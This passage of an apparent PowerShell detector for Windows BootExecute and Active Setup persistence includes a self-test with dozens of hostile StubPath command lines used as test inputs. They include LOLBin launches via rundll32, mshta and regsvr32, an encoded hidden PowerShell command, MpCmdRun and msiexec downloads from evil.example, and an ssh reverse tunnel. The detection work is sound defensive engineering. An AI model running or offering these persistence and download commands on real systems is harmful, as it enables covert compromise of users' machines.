    T 'a DLL host whose DLL is gone from System32 is INFO (stale)' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*gone\.dll, which is not on disk') $v.Line
    $script:disk['c:\progra~1\window~1\winmail.exe'] = @{ State = 'signed'; CN = 'Microsoft Windows'; Microsoft = $true; RealPath = 'C:\Program Files\Windows Mail\WinMail.exe' }
    $v = StubCase 'C:\PROGRA~1\WINDOW~1\WinMail.exe OCInstallUserConfigOE'
    T 'a short (8.3) path is judged on the folder it really names' ($v.Sev -eq 'OK' -and $v.Line -match '^\[OK\] .*C:\\Program Files\\Windows Mail\\WinMail\.exe') $v.Line

    # ---- hostile lines: every one must be raised ----
    # The retrospective's 17 (2026-11-28), of which the first version read
    # [OK] or [INFO] for 11.
    $hostile = @(
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\System32\rundll32.exe C:\ProgramData\Acme\evil.dll,Run', 'not validly signed \(C:\\ProgramData\\Acme\\evil\.dll\)'),
        @('cmd.exe /D /C start C:\Windows\System32\wscript.exe C:\ProgramData\Acme\x.vbs', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\cmd.exe /c C:\ProgramData\Acme\x.bat', 'script host'),
        @('cmd.exe /D /C start C:\Windows\System32\mshta.exe C:\ProgramData\Acme\x.hta', 'script host'),
        @('C:\Program Files\Common Files\Acme\cache.dat -k', 'runs C:\\Program Files\\Common Files\\Acme\\cache\.dat .* not validly signed'),
        @('"C:\Program Files\Common Files\Acme\cache.dat" -k', 'not validly signed'),
        @('pcalua.exe -a C:\ProgramData\Acme\evil.exe', 'hands pcalua\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\evil\.exe\)'),
        @('explorer.exe C:\ProgramData\Acme\evil.exe', 'hands explorer\.exe a file that is not validly signed'),
        @('msiexec.exe /i C:\ProgramData\Acme\x.msi /qn', 'hands msiexec\.exe a file that is not validly signed'),
        @('forfiles.exe /p C:\Windows /m notepad.exe /c C:\ProgramData\Acme\evil.exe', 'hands forfiles\.exe a file that is not validly signed'),
        @('C:\Windows\System32\wbem\WMIC.exe process call create C:\ProgramData\Acme\evil.exe', 'hands wmic\.exe a file that is not validly signed'),
        @('conhost.exe --headless C:\ProgramData\Acme\evil.exe', 'hands conhost\.exe a file that is not validly signed'),
        @('evil.payload /s', 'names a program without its folder'),
        @('rundll32 C:\ProgramData\Acme\evil.dll,Run', 'hands rundll32\.exe a file that is not validly signed'),
        @('mshta.exe C:\ProgramData\Acme\x.hta', 'script host'),
        @('regsvr32.exe /s C:\ProgramData\Acme\evil.dll', 'hands regsvr32\.exe a file that is not validly signed'),
        @('C:\ProgramData\Acme\evil.exe', 'runs C:\\ProgramData\\Acme\\evil\.exe .* not validly signed'),
        # each host again behind `cmd /C start`, and the shapes found while rewriting
        @('cmd.exe /C start pcalua.exe -a C:\ProgramData\Acme\evil.exe', 'hands pcalua\.exe a file that is not validly signed'),
        @('cmd.exe /D /C start msiexec.exe /i C:\ProgramData\Acme\x.msi', 'hands msiexec\.exe a file that is not validly signed'),
        @('cmd.exe /D /C start C:\ProgramData\Acme\evil.exe', 'runs C:\\ProgramData\\Acme\\evil\.exe .* not validly signed'),
        @('cmd.exe /D /C start cmd.exe /D /C start cmd.exe /D /C start C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('cmd.exe /C start "" C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('cmd.exe /D /C start /min C:\Windows\System32\ie4uinit.exe', 'script host'),
        @('C:\Windows\system32\cmd.exe /D /C start C:\Windows\system32\ie4uinit.exe -ClearIconCache & C:\ProgramData\Acme\evil.exe', 'script host'),
        @('cmd.exe /D /C start %NOSUCHVAR_DZ%\x.exe', 'script host'),
        @('cmd.exe /c C:\ProgramData\Vendor\setup.cmd', 'script host.*cmd\.exe /c C:\\ProgramData\\Vendor\\setup\.cmd'),
        @('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -File C:\ProgramData\Acme\x.ps1', 'script host'),
        @('C:\ProgramData\Vendor\agent.exe /user', 'not validly signed \(NotSigned\)'),
        @('"C:\Program Files\Vendor\locked.exe"', 'could not be read'),
        @('C:\Windows\System32\rundll32.exe', 'names no file this check could resolve'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\shell32.dll",Control_RunDLL C:\ProgramData\Acme\x.cpl', 'hands rundll32\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\x\.cpl\)'),
        @('rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\ProgramData\Vendor\later.cpl', 'a file that is not there \(C:\\ProgramData\\Vendor\\later\.cpl\)'),
        @('rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\Acme\evil.inf,DefaultInstall', 'hands rundll32\.exe a file that is not there \(C:\\ProgramData\\Acme\\evil\.inf\)'),
        @('rundll32.exe nosuch.dll,Entry', 'names nosuch\.dll for rundll32\.exe'),
        @('rundll32.exe pcwutl.dll,LaunchApplication powershell.exe', 'hands the work on to another host \(powershell\.exe\) through rundll32\.exe'),
        @('pcalua.exe -a C:\Windows\System32\cmd.exe', 'hands the work on to another host \(C:\\Windows\\System32\\cmd\.exe\) through pcalua\.exe'),
        @('forfiles.exe /p C:\Windows /m notepad.exe', 'runs forfiles\.exe, a Windows tool this check knows no Active Setup use for'),
        @('C:\Windows\System32\OpenSSH\ssh.exe -N -R 2222:localhost:3389 user@203.0.113.7', 'runs ssh\.exe, a Windows tool this check knows no Active Setup use for'),
        @('reg.exe add HKCU\Software\Example /v Flag /d 1 /f', 'runs reg\.exe, a Windows tool this check knows no Active Setup use for'),
        @('"C:\Program Files\Internet Explorer\iexplore.exe" https://evil.example/landing', 'hands iexplore\.exe an address \(https://evil\.example/landing\)'),
        @('"C:\Program Files\Vendor\app.exe" --launcher="cmd /c C:\ProgramData\Acme\x.bat"', 'hands app\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\x\.bat\)'),
        @('"C:\Program Files\Vendor\app.exe" --launcher="cmd /c echo hi"', 'hands the work on to another host \(cmd\) through app\.exe'),
        @('C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\ProgramData\Acme\evil.xml', 'hands msbuild\.exe a file that is not validly signed'),
        @('reg.exe import C:\ProgramData\Vendor\cfg.xml', 'hands reg\.exe a file that is not validly signed'),
        @('forfiles.exe /p C:\Windows /m notepad.exe /c "cmd /c echo hi"', 'hands the work on to another host \(cmd\) through forfiles\.exe'),
        @('pcalua.exe -a ..\..\ProgramData\Acme\evil.exe', 'a relative path'),
        @('pcalua.exe -a nosuch.exe', 'names nosuch\.exe for pcalua\.exe'),
        @('msiexec.exe /i \\203.0.113.7\share\x.msi', 'hands msiexec\.exe a network path \(\\\\203\.0\.113\.7\\share\\x\.msi\) -- not opened'),
        @('rundll32.exe Z:\tools\x.dll,Run', 'not a plain file on a local fixed drive \(Z:\\tools\\x\.dll\) -- not opened'),
        @('C:\Windows\System32\ie4uinit.exe -url ftp://203.0.113.7/x', 'hands ie4uinit\.exe an address'),
        @('\\203.0.113.7\share\evil.exe /s', 'names a program that is not a plain file on a local fixed drive \(\\\\203\.0\.113\.7\\share\\evil\.exe\) -- not opened'),
        @('Z:\tools\setup.exe', 'not a plain file on a local fixed drive \(Z:\\tools\\setup\.exe\) -- not opened'),
        @('E:\autorun\setup.exe /s', 'not a plain file on a local fixed drive'),
        @('C:\Windows\System32\CON', 'not a plain file on a local fixed drive'),
        @('C:\ProgramData\Vendor\cfg.xml:evil.exe', 'not a plain file on a local fixed drive'),
        @('C:\ProgramData\Acme\ie4uinit.exe -BaseSettings', 'a Microsoft-signed program from outside Windows and Program Files \(C:\\ProgramData\\Acme\\ie4uinit\.exe\)'),
        @('"C:\Program Files\Vendor\app.exe" C:\ProgramData\Acme\evil.js', 'hands app\.exe a file that is not validly signed \(C:\\ProgramData\\Acme\\evil\.js\)'),
        @('C:\ProgramData\Vendor\gone.exe', 'which is not on disk, in a folder outside Windows and Program Files: a file placed there later runs'),
        @('C:\Windows\Tasks\gone.exe', 'which is not on disk, in a folder outside Windows and Program Files'),
        @('sub\folder\tool.exe /x', 'which is not on disk'),
        @('nohere.exe /s', 'names a program without its folder \(nohere\.exe\)'),
        @('C:\ProgramData\Acme\x.vbs', 'runs a script file'))
    foreach ($h in $hostile) {
        $v = StubCase $h[0]
        T "hostile: '$($h[0])' is raised" ($v.Sev -eq 'WARNING' -and $v.Line -match '^\[WARNING\] ' -and $v.Line -match $h[1]) $v.Line
    }
    $crit = @(
        @('C:\Users\Public\update.exe', "^\[CRITICAL\] Active Setup 'dz' StubPath runs C:\\Users\\Public\\update\.exe from a staging path"),
        @('rundll32.exe C:\Users\Public\x.dll,Run', 'hands a file in a staging path to rundll32\.exe'),
        @('powershell.exe -NoProfile -File C:\Users\Public\x.ps1', 'hands a file in a staging path to powershell\.exe'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\shell32.dll",Control_RunDLL C:\Users\Public\evil.cpl', 'hands a file in a staging path'),
        @('pcalua.exe -a C:/Users/Public/evil.exe', 'staging path'),
        @(('powershell.exe -w hidden -' + 'enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'), 'attack-shaped command content'),
        @('rundll32.exe url.dll,FileProtocolHandler C:\ProgramData\Acme\evil.exe', 'attack-shaped command content \(fileprotocolhandler\)'),
        @('rundll32.exe shell32.dll,ShellExec_RunDLL C:\ProgramData\Acme\evil.exe', 'attack-shaped command content'),
        @('msiexec.exe /q /i https://evil.example/x.msi', 'attack-shaped command content'),
        @(('"C:\Program Files\Windows Defender\MpCmdRun.exe" -Download' + 'File -url https://evil.example/x -path C:\ProgramData\Acme\dl.exe'), 'attack-shaped command content \(downloadfile\)'),
        @('cmd.exe /D /C start rundll32.exe url.dll,FileProtocolHandler C:\ProgramData\Acme\evil.exe', 'attack-shaped command content'))
    foreach ($h in $crit) {
        $v = StubCase $h[0]
        T "hostile: '$($h[0])' is CRITICAL" ($v.Sev -eq 'CRITICAL' -and $v.Line -match $h[1]) $v.Line
    }
    $v = StubCase 'C:\Users\Public\update.exe' '0'
    T 'an entry switched off (IsInstalled=0) is INFO even when hostile: Windows does not run it' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*IsInstalled=0') $v.Line
    $v = StubCase 'C:\Users\Public\update.exe' 'String:0'
    T 'a non-DWORD IsInstalled of 0 is graded as installed (here CRITICAL), never read as switched off' ($v.Sev -eq 'CRITICAL') $v.Line

    # ---- the malign twins of the two argument-only Windows entries ----
    $script:onPath['u.exe'] = 'C:\Users\me\AppData\Local\Programs\Tool\U.exe'
    Add-File 'C:\Users\me\AppData\Local\Programs\Tool\U.exe' 'vendor'
    $v = StubCase 'U'
    T "a U.exe on the search path shadows the 'U' StubPath -- a WARNING naming it, even validly signed" ($v.Sev -eq 'WARNING' -and $v.Line -match 'would find C:\\Users\\me\\AppData\\Local\\Programs\\Tool\\U\.exe') $v.Line
    $script:onPath.Remove('u.exe')
    Add-File 'C:\UserInstall.exe' 'vendor'
    $v = StubCase '/UserInstall'
    T "a C:\UserInstall.exe shadows the '/UserInstall' StubPath -- a WARNING naming it" ($v.Sev -eq 'WARNING' -and $v.Line -match 'would find C:\\UserInstall\.exe') $v.Line
    $script:disk.Remove('c:\userinstall.exe')

    # ---- nothing that is not a plain local file was ever opened ----
    $bad = @($script:opened | Where-Object { $_ -notmatch '^C:\\' -or $_ -match '(?i)\\(CON|NUL)(\.|$)' -or $_.IndexOf(':', 2) -ge 0 })
    T 'no network, mapped, removable, device or stream path reached the file probe' ($bad.Count -eq 0 -and $script:opened.Count -gt 50) (($bad | Select-Object -First 3) -join ' | ')

    # ---- pieces ----
    $it = @(Get-HandedItems -Rest ' C:\Program Files\Vendor\x y.dll,Entry' -Probe $probe -DriveKind $dk)
    T 'an unquoted DLL path with spaces is read to the name that ends like a file' ($it.Count -eq 1 -and $it[0].Text -eq 'C:\Program Files\Vendor\x y.dll') (($it | ForEach-Object { $_.Kind + '=' + $_.Text }) -join ' | ')
    $it = @(Get-HandedItems -Rest ' /a {REGSVR C:\ProgramData\Acme\evil.dll}' -Probe $probe -DriveKind $dk)
    T 'a path inside braces is found without the brace' ($it.Count -eq 1 -and $it[0].Text -eq 'C:\ProgramData\Acme\evil.dll') (($it | ForEach-Object { $_.Kind + '=' + $_.Text }) -join ' | ')
    $it = @(Get-HandedItems -Rest ' /s /n /i:/UserInstall --channel=stable OCInstallUserConfigOE -UserConfig /FirstLogon' -Probe $probe -DriveKind $dk)
    T 'switches and plain words are not handed files' ($it.Count -eq 0) (($it | ForEach-Object { $_.Kind + '=' + $_.Text }) -join ' | ')
    T 'the Windows folder is admin-only by name, its user-writable folders are not, and neither is ProgramData' ((Test-AdminOnlyPath 'C:\Windows\System32\x.dll' $SR) -and (Test-AdminOnlyPath 'C:\Program Files (x86)\V\x.exe' $SR) -and (Test-AdminOnlyPath 'C:\Program.exe' $SR) -and -not (Test-AdminOnlyPath 'C:\Windows\Tasks\x.exe' $SR) -and -not (Test-AdminOnlyPath 'C:\ProgramData\x.exe' $SR) -and -not (Test-AdminOnlyPath 'D:\Program Files\V\x.exe' $SR)) ''

    # ---- the report: gaps, and a planted entry beside a benign one ----
    function ReportCase { param([object[]]$Roots)
        return (Get-ActiveSetupReport -Roots $Roots -Probe $probe -DriveKind $dk -Which $which -SystemRoot $SR -SystemDrive 'C:')
    }
    $mail = @{ Key = '{A}'; Name = 'Windows Mail'; Stub = '"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE'; IsInstalled = '1' }
    $a = ReportCase @(
        @{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @('{BAD}'); Entries = @($mail, @{ Key = '{B}'; Name = ''; Stub = ''; IsInstalled = '1' }) },
        @{ Root = 'R2'; Required = $false; State = 'nokey' }); $t = $a.Lines -join "`n"
    T 'an unreadable component is a raised gap naming it; an optional root that is absent is not' ($a.Gap -eq 'WARNING' -and $a.Sev -eq 'OK' -and $t -match '1 component\(s\) under R1 that could not be read: \{BAD\}' -and $t -notmatch 'R2' -and $t -notmatch 'none suspicious') $t
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'nokey' })
    T 'a missing native Installed Components key is a gap' ($a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -match 'NOT performed') ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'unreadable'; Error = 'denied' })
    T 'an unreadable Installed Components key is a gap, never the all-clear' ($a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -notmatch '\[OK\]') ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @($mail, @{ Key = '{E}'; Name = "it's"; Stub = 'C:\Users\Public\update.exe'; IsInstalled = '1' }) })
    T 'a planted entry beside a benign one: CRITICAL, one hit, no all-clear, and an apostrophe in its name cannot end the label' ($a.Sev -eq 'CRITICAL' -and @($a.Hits).Count -eq 1 -and ($a.Lines -join ' ') -notmatch 'none suspicious' -and ($a.Lines -join "`n") -match "(?m)^\[CRITICAL\] Active Setup '\{E\} \(its\)' ") ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @($mail) })
    T 'only benign entries: the all-clear with the count' ($a.Sev -eq 'OK' -and $a.Gap -eq 'OK' -and ($a.Lines -join "`n") -match '(?m)^\[OK\] Active Setup: 1 StubPath command\(s\) graded, none suspicious\.$') ($a.Lines -join ' | ')

    $env:SystemRoot = $savedSR
    if ($fails) { Write-Output "[FAIL] $fails boot_activesetup_check self-test expectation(s) unmet"; exit 1 }
    Write-Output "[OK] boot_activesetup_check self-test: Windows' own entries read clean on a pretend disk that says 'absent' by default, every hostile line is raised, and no path that is not a plain local file was opened."
    exit 0
}

# ---- live readers --------------------------------------------------------

# A short (8.3) path names the same file as its long form; the folder tests
# are by name, so they need the long one. Any failure keeps the path as
# given, which only makes the verdict more cautious.
function Get-LongPath {
    param([string]$Path)
    if ($Path -notmatch '~') { return $Path }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.LongPath').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name LongPath -MemberDefinition @'
[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern uint GetLongPathName(string lpszShortPath, System.Text.StringBuilder lpszLongPath, uint cchBuffer);
'@
        }
        $sb = New-Object System.Text.StringBuilder 1024
        $n = [DozeSec.LongPath]::GetLongPathName($Path, $sb, 1024)
        if ($n -gt 0 -and $n -lt 1024) { return $sb.ToString() }
    } catch {}
    return $Path
}

# Facts about one file: signed|unsigned|unverified|absent|unread|dir. Absent
# only when the parent answers without it (Test-AbsentForSure). Called only
# through Get-FileFacts, so only for a plain path on a local fixed drive.
$script:factCache = @{}
function Get-ImageFacts {
    param([string]$Path)
    $key = $Path.ToLowerInvariant()
    if ($script:factCache.ContainsKey($key)) { return $script:factCache[$key] }
    $r = $null
    $it = $null
    try { $it = Get-Item -LiteralPath $Path -Force -ErrorAction Stop }
    catch {
        if (Test-AbsentForSure $Path) { $r = @{ State = 'absent' } }
        else { $r = @{ State = 'unread'; Why = (Get-OneLine $_.Exception.Message) } }
    }
    if ($null -eq $r) {
        if ($it.PSIsContainer) { $r = @{ State = 'dir' } }
        else {
            $real = Get-LongPath $Path
            $sig = $null
            try { $sig = Get-AuthenticodeSignature -LiteralPath $Path -ErrorAction Stop }
            catch { $r = @{ State = 'unverified'; Why = (Get-OneLine $_.Exception.Message); RealPath = $real } }
            if ($null -eq $r) {
                if ($sig.Status -ne 'Valid' -or -not $sig.SignerCertificate) { $r = @{ State = 'unsigned'; Status = [string]$sig.Status; RealPath = $real } }
                else {
                    $subj = [string]$sig.SignerCertificate.Subject
                    $cn = $subj
                    if ($subj -match '(?:^|,\s*)CN=(.+?)(?:,\s*[A-Za-z]+=|$)') { $cn = $Matches[1].Trim().Trim('"') }
                    $r = @{ State = 'signed'; CN = $cn; Microsoft = ($cn -match '^Microsoft\b'); RealPath = $real }
                }
            }
        }
    }
    $script:factCache[$key] = $r
    return $r
}

# One Installed Components root, through .NET so a component name is never a
# wildcard and one restricted component does not lose the rest.
function Read-ActiveSetupRoot {
    param([string]$Root, [bool]$Required)
    $out = @{ Root = $Root; Required = $Required; State = 'ok'; Error = ''; Unread = @(); Entries = @() }
    $k = $null
    if ($Root -match '^(?i)HKLM:\\(.+)$') {
        # Through the 64-bit view on a 64-bit Windows: a 32-bit PowerShell
        # would otherwise be redirected to WOW6432Node and read that twice,
        # never the native key, and still print the all-clear.
        $rel = $Matches[1]
        $view = if ([Environment]::Is64BitOperatingSystem) { [Microsoft.Win32.RegistryView]::Registry64 } else { [Microsoft.Win32.RegistryView]::Default }
        try {
            $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $view)
            $k = $base.OpenSubKey($rel, $false)
        } catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
        if ($null -eq $k) { $out.State = 'nokey'; return $out }
    } else {
        try { $k = Get-Item -LiteralPath $Root -ErrorAction Stop }
        catch {
            if ($_.Exception -is [System.Management.Automation.ItemNotFoundException]) { $out.State = 'nokey'; return $out }
            $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out
        }
    }
    $names = @()
    try { $names = @($k.GetSubKeyNames()) }
    catch { $out.State = 'unreadable'; $out.Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); return $out }
    $unread = New-Object System.Collections.Generic.List[string]
    $ents = New-Object System.Collections.Generic.List[object]
    foreach ($n in $names) {
        $sk = $null
        try {
            $sk = $k.OpenSubKey($n, $false)
            if ($null -eq $sk) { continue }
            $stub = $sk.GetValue('StubPath', $null)
            $inst = $sk.GetValue('IsInstalled', $null)
            $disp = $sk.GetValue('', $null)
            # Only a DWORD 0 is "switched off": Windows' own entries store
            # IsInstalled as a DWORD. Any other type is graded as installed, and named,
            # so a REG_SZ "0" cannot read as off while Windows runs it.
            $iv = ''
            if ($null -ne $inst) {
                $ik = [string]$sk.GetValueKind('IsInstalled')
                $iv = if ($ik -eq 'DWord') { [string]$inst } else { "${ik}:" + (@($inst) -join ' ') }
            }
            $ents.Add(@{ Key = $n; Name = (Get-OneLine ([string]$disp)); Stub = [string]$stub; IsInstalled = $iv })
        } catch { $unread.Add($n) }
        finally { if ($sk) { $sk.Close() } }
    }
    $k.Close()
    $out.Unread = @($unread.ToArray()); $out.Entries = @($ents.ToArray())
    return $out
}

$probeLive = { param([string]$p) Get-ImageFacts $p }
$driveKindLive = { param([string]$l) try { [string](New-Object System.IO.DriveInfo ($l + ':\')).DriveType } catch { '' } }
# A name without a folder: System32, the Windows folder, then this account's
# PATH. (The folder Windows starts the command in, and another account's own
# PATH folders, are not known here.)
$whichLive = {
    param([string]$n)
    foreach ($d in @((Join-Path $env:SystemRoot 'System32'), $env:SystemRoot)) {
        $c = Join-Path $d $n
        if (Test-Path -LiteralPath $c -PathType Leaf) { return $c }
    }
    $g = @(Get-Command -Name ([System.Management.Automation.WildcardPattern]::Escape($n)) -CommandType Application -ErrorAction SilentlyContinue)
    if ($g.Count) { return [string]$g[0].Source }
    return ''
}
$sysRoot = $env:SystemRoot
$sysDrive = $env:SystemDrive
if (-not $sysDrive) { $sysDrive = $sysRoot.Substring(0, 2) }

# ---- 1. BootExecute and siblings (T1547.001) -----------------------------
'--- [T1547.001] BootExecute: native programs Session Manager runs before Windows starts ---'
$smKey = if ($CiSessionKey) { $CiSessionKey } else { 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager' }
$reads = @{}
foreach ($v in $script:BootValues) { $reads[$v] = Read-RegValueState -KeyPath $smKey -Name $v }
$boot = Get-BootReport -Reads $reads -Probe $probeLive -DriveKind $driveKindLive -KeyLabel $smKey -SystemRoot $sysRoot
$boot.Lines
if ($boot.Sev -ne 'OK') {
    Write-WhenCaveat
    foreach ($h in @($boot.Hits)) { $w = Get-WhenLine -KeyPath $smKey -FilePath $h; if ($w) { "  $h" + $w.Substring(1) } }
}
Write-Marker -Name 'bootexec' -Sev $boot.Sev
if ($boot.Gap -ne 'OK') { Write-Marker -Name 'bootexec_gap' -Sev $boot.Gap }

# ---- 2. Active Setup (T1547.014) -----------------------------------------
''
"--- [T1547.014] Active Setup: StubPath commands run at each user's next sign-in ---"
$asRoots = @()
if ($CiActiveSetupRoots.Count) {
    $first = $true
    foreach ($r in $CiActiveSetupRoots) { $asRoots += ,(Read-ActiveSetupRoot -Root $r -Required $first); $first = $false }
} else {
    $asRoots += ,(Read-ActiveSetupRoot -Root 'HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components' -Required $true)
    $asRoots += ,(Read-ActiveSetupRoot -Root 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Active Setup\Installed Components' -Required $false)
}
$as = Get-ActiveSetupReport -Roots $asRoots -Probe $probeLive -DriveKind $driveKindLive -Which $whichLive -SystemRoot $sysRoot -SystemDrive $sysDrive
$as.Lines
if ($as.Sev -ne 'OK') {
    Write-WhenCaveat
    foreach ($h in @($as.Hits)) { $w = Get-WhenLine -KeyPath $h.Key -FilePath $h.File; if ($w) { "  $($h.Key)" + $w.Substring(1) } }
}
Write-Marker -Name 'activesetup' -Sev $as.Sev
if ($as.Gap -ne 'OK') { Write-Marker -Name 'activesetup_gap' -Sev $as.Gap }
# Written last: the caller raises "produced no verdict" when it is absent.
Write-Marker -Name 'bootas_done' -Sev 'done'
